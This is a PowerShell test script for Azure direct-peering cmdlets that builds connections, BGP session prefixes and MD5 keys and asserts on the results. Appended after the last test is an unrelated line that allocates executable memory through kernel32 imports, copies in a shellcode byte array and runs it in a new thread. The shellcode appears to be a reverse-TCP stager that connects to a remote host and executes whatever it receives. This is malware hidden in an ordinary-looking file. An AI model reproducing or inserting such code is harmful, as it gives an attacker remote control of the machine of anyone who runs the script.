













function NewDirectConnectionV4V6($facilityId,$bandwidth)
{
	Write-Debug "Creating Connection at $facilityId"
	$md5 = getHash
	$md5 = $md5.ToString()
	Write-Debug "Created Hash $md5"
	$rand1 = Get-Random -Maximum 20 -Minimum 3
	$rand2 = Get-Random -Maximum 200 -Minimum 1
	$sessionv4 = newIpV4Address $true $true 0 $rand2
	$sessionv6 = newIpV6Address $true $true 0 $rand2
	Write-Debug "Created IPs $sessionv4 $SessionPrefixV6"
	$maxv4 = maxAdvertisedIpv4
	$maxv6 = maxAdvertisedIpv6
	Write-Debug "Created maxAdvertised $maxv4 $maxv6"

    $createdConnection = New-AzPeeringDirectConnectionObject -PeeringDbFacilityId $facilityId -SessionPrefixV4 $sessionv4 -SessionPrefixV6 $sessionv6 -MaxPrefixesAdvertisedIPv4 $maxv4 -MaxPrefixesAdvertisedIPv6 $maxv6 -BandwidthInMbps $bandwidth -MD5AuthenticationKey $md5
	Write-Debug "Created Connection $createdConnection"






	return $createdConnection
}

function Test-NewDirectPeering
{
	
	$kind = isDirect $true;
	$loc = "Amsterdam"
	$resourceGroup = "testCarrier";
	Write-Debug $resourceGroup
	
	$resourceName = getAssetName "DirectOneConnection";
	Write-Debug "Setting $resourceName"
    $peeringLocation = getPeeringLocation $kind $loc;
	Write-Debug "Getting the Asn Information"
	$randNum = getRandomNumber
	Write-Debug "Random Number $randNum";
	$peerAsn = makePeerAsn $randNum
	$asn = $peerAsn
	$facilityId = $peeringLocation[0].PeeringDBFacilityId
	
	$bandwidth = getBandwidth
	$directConnection = NewDirectConnectionV4V6 $facilityId $bandwidth
	$tags = @{"tfs_$randNum" = "value1"; "tag2" = "value2"}
	$md5 =  $directConnection.BgpSession.Md5AuthenticationKey
	$sessionv4 = getPeeringVariable "sessionv4" $directConnection.BgpSession.SessionPrefixV4
	$sessionv6 = getPeeringVariable "sessionv6" $directConnection.BgpSession.SessionPrefixV6
	Write-Debug "Creating New Peering: $resourceName."
    $createdPeering = New-AzPeering -Name $resourceName -ResourceGroupName $resourceGroup -PeeringLocation $peeringLocation[0].PeeringLocation -Sku "Basic_Direct_Free" -PeerAsnResourceId $asn.Id -DirectConnection $directConnection -Tag $tags
	Write-Debug "Created New Peering: $createdPeering$Name"
	Assert-NotNull $createdPeering
	Assert-AreEqual $kind $createdPeering.Kind
	Assert-AreEqual $resourceName $createdPeering.Name
	Assert-AreEqual $peeringLocation[0].PeeringLocation $createdPeering.PeeringLocation
	Assert-AreEqual $md5 $createdPeering.Connections[0].BgpSession.Md5AuthenticationKey
	Assert-AreEqual $facilityId $createdPeering.Connections[0].PeeringDBFacilityId 
    Assert-AreEqual $bandwidth $createdPeering.Connections[0].BandwidthInMbps
	Assert-AreEqual $sessionv4 $createdPeering.Connections[0].BgpSession.SessionPrefixV4
    Assert-AreEqual $sessionv6 $createdPeering.Connections[0].BgpSession.SessionPrefixV6
}

function Test-NewDirectPeeringWithPipe
{
	
	$kind = isDirect $true;
	$loc = "Seattle"
	$resourceGroup = "testCarrier";
	Write-Debug $resourceGroup
	
	Write-Debug "Getting the Asn Information"
	$randNum = getRandomNumber
	Write-Debug "Random Number $randNum";
	$peerAsn = makePeerAsn $randNum
	$asn = $peerAsn
	
	$resourceName = getAssetName "DirectPipeConnection";
	Write-Debug "Setting $resourceName"
    $peeringLocation = getPeeringLocation $kind $loc;
	$facilityId = $peeringLocation[0].PeeringDBFacilityId
	
	$bandwidth = getBandwidth
	$directConnection = NewDirectConnectionV4V6 $facilityId $bandwidth
	$tags = @{"tfs_$randNum" = "value1"; "tag2" = "value2"}
	$md5 =  $directConnection.BgpSession.Md5AuthenticationKey
	$sessionv4 = getPeeringVariable "sessionv4" $directConnection.BgpSession.SessionPrefixV4
	$sessionv6 = getPeeringVariable "sessionv6" $directConnection.BgpSession.SessionPrefixV6
	Write-Debug "Creating New Peering: $resourceName."
    $createdPeering =  New-AzPeering -Name $resourceName -ResourceGroupName $resourceGroup -PeeringLocation $peeringLocation[0].PeeringLocation -Sku "Basic_Direct_Free" -PeerAsnResourceId $asn.Id -Tag $tags -DirectConnection ($directConnection) 
	Assert-NotNull $createdPeering
	Assert-AreEqual "Direct" $createdPeering.Kind
	Assert-AreEqual $resourceName $createdPeering.Name
	Assert-AreEqual $peeringLocation[0].PeeringLocation $createdPeering.PeeringLocation
	Assert-AreEqual $md5 $createdPeering.Connections[0].BgpSession.Md5AuthenticationKey
	Assert-AreEqual $facilityId $createdPeering.Connections[0].PeeringDBFacilityId 
    Assert-AreEqual $bandwidth $createdPeering.Connections[0].BandwidthInMbps
	Assert-AreEqual $sessionv4 $createdPeering.Connections[0].BgpSession.SessionPrefixV4
    Assert-AreEqual $sessionv6 $createdPeering.Connections[0].BgpSession.SessionPrefixV6
}

function Test-NewDirectPeeringPipeTwoConnections
{
	
	$kind = isDirect $true;
	$loc = "Ashburn"
	$resourceGroup = "testCarrier";
	Write-Debug $resourceGroup
		
	Write-Debug "Getting the Asn Information"
	$randNum = getRandomNumber
	Write-Debug "Random Number $randNum";
	$peerAsn = makePeerAsn $randNum
	$asn = $peerAsn
	
	$resourceName = getAssetName "DirectOneConnection";
	Write-Debug "Setting $resourceName"
    $peeringLocation = getPeeringLocation $kind $loc;
	$facilityId = $peeringLocation[0].PeeringDBFacilityId
	
	$bandwidth = getBandwidth
	$bandwidth2 = getBandwidth
	$tags = @{"tfs_$randNum" = "value1"; "tag2" = "value2"}
	Write-Debug "Creating New Peering: $resourceName."
	$connection1 = NewDirectConnectionV4V6 $facilityId $bandwidth
	
	$sessionv4 = getPeeringVariable "sessionv4" $connection1.BgpSession.SessionPrefixV4
	$sessionv6 = getPeeringVariable "sessionv6" $connection1.BgpSession.SessionPrefixV6
	$md5 =  $connection1.BgpSession.Md5AuthenticationKey
	
	$connection2 = NewDirectConnectionV4V6 $facilityId $bandwidth2
	
    $createdPeering = New-AzPeering -Name $resourceName -ResourceGroupName $resourceGroup -PeeringLocation $peeringLocation[0].PeeringLocation -Sku "Basic_Direct_Free" -PeerAsnResourceId $asn.Id -Tag $tags -DirectConnection $connection1, $connection2
	Assert-NotNull $createdPeering
	Assert-AreEqual $kind $createdPeering.Kind
	Assert-AreEqual $resourceName $createdPeering.Name
	Assert-AreEqual $peeringLocation[0].PeeringLocation $createdPeering.PeeringLocation
	Assert-AreEqual $md5 $createdPeering.Connections[0].BgpSession.Md5AuthenticationKey
	Assert-AreEqual $facilityId $createdPeering.Connections[0].PeeringDBFacilityId 
    Assert-AreEqual $bandwidth $createdPeering.Connections[0].BandwidthInMbps
	Assert-AreEqual $sessionv4 $createdPeering.Connections[0].BgpSession.SessionPrefixV4
    Assert-AreEqual $sessionv6 $createdPeering.Connections[0].BgpSession.SessionPrefixV6
	Assert-NotNull $createdPeering.Connections[1].BgpSession
}


function Test-NewDirectPeeringPremiumDirectFree
{
	
	$kind = isDirect $true;
	$loc = "Ashburn"
	$resourceGroup = "testCarrier";
	Write-Debug $resourceGroup
	
	Write-Debug "Getting the Asn Information"
	$randNum = getRandomNumber
	Write-Debug "Random Number $randNum";
	$peerAsn = makePeerAsn $randNum
	$asn = $peerAsn
	
	$resourceName = getAssetName "DirectOneConnection";
	Write-Debug "Setting $resourceName"
    $peeringLocation = getPeeringLocation $kind $loc;
	$facilityId = $peeringLocation[0].PeeringDBFacilityId
	
	$bandwidth = getBandwidth
	$bandwidth2 = getBandwidth
	$tags = @{"tfs_$randNum" = "value1"; "tag2" = "value2"}
	$connection1 = NewDirectConnectionV4V6 $facilityId $bandwidth
	
	$sessionv4 = getPeeringVariable "sessionv4" $connection1.BgpSession.SessionPrefixV4
	$sessionv6 = getPeeringVariable "sessionv6" $connection1.BgpSession.SessionPrefixV6
	$md5 =  $connection1.BgpSession.Md5AuthenticationKey
	
	$connection2 = NewDirectConnectionV4V6 $facilityId $bandwidth2
	
	$connection2.UseForPeeringService = $true
    $createdPeering = New-AzPeering -Name $resourceName -ResourceGroupName $resourceGroup -PeeringLocation $peeringLocation[0].PeeringLocation -Sku "Basic_Direct_Free" -PeerAsnResourceId $asn.Id -Tag $tags -DirectConnection $connection1, $connection2
	Assert-NotNull $createdPeering
	Assert-AreEqual $kind $createdPeering.Kind
	Assert-AreEqual $resourceName $createdPeering.Name
	Assert-AreEqual $peeringLocation[0].PeeringLocation $createdPeering.PeeringLocation
	Assert-AreEqual $md5 $createdPeering.Connections[0].BgpSession.Md5AuthenticationKey
	Assert-AreEqual $facilityId $createdPeering.Connections[0].PeeringDBFacilityId 
    Assert-AreEqual $bandwidth $createdPeering.Connections[0].BandwidthInMbps
	Assert-AreEqual $sessionv4 $createdPeering.Connections[0].BgpSession.SessionPrefixV4
    Assert-AreEqual $sessionv6 $createdPeering.Connections[0].BgpSession.SessionPrefixV6
	Assert-AreEqual "Premium_Direct_Free" $createdPeering.Sku.Name
	Assert-NotNull $createdPeering.Connections[1].BgpSession
}


function Test-NewDirectPeeringPremiumDirectUnlimited
{
	
	$kind = isDirect $true;
	$loc = "Ashburn"
	$resourceGroup = "testCarrier";
	Write-Debug $resourceGroup
	
	Write-Debug "Getting the Asn Information"
	$randNum = getRandomNumber
	Write-Debug "Random Number $randNum";
	$peerAsn = makePeerAsn $randNum
	$asn = $peerAsn
	
	$resourceName = getAssetName "DirectOneConnection";
	Write-Debug "Setting $resourceName"
    $peeringLocation = getPeeringLocation $kind $loc;
	$facilityId = $peeringLocation[0].PeeringDBFacilityId
	
	$bandwidth = getBandwidth
	$bandwidth2 = getBandwidth
	$tags = @{"tfs_$randNum" = "value1"; "tag2" = "value2"}
	$connection1 = NewDirectConnectionV4V6 $facilityId $bandwidth
	
	$sessionv4 = getPeeringVariable "sessionv4" $connection1.BgpSession.SessionPrefixV4
	$sessionv6 = getPeeringVariable "sessionv6" $connection1.BgpSession.SessionPrefixV6
	$md5 =  $connection1.BgpSession.Md5AuthenticationKey
	
	$connection2 = NewDirectConnectionV4V6 $facilityId $bandwidth2
	
	$connection2.UseForPeeringService = $true
    Assert-ThrowsContains { $createdPeering = New-AzPeering -Name $resourceName -ResourceGroupName $resourceGroup -PeeringLocation $peeringLocation[0].PeeringLocation -Sku "Premium_Direct_Unlimited" -PeerAsnResourceId $asn.Id -Tag $tags -DirectConnection $connection1, $connection2 } "Peering SKU is invalid for Direct"
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x6d,0x58,0xf2,0xb0,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

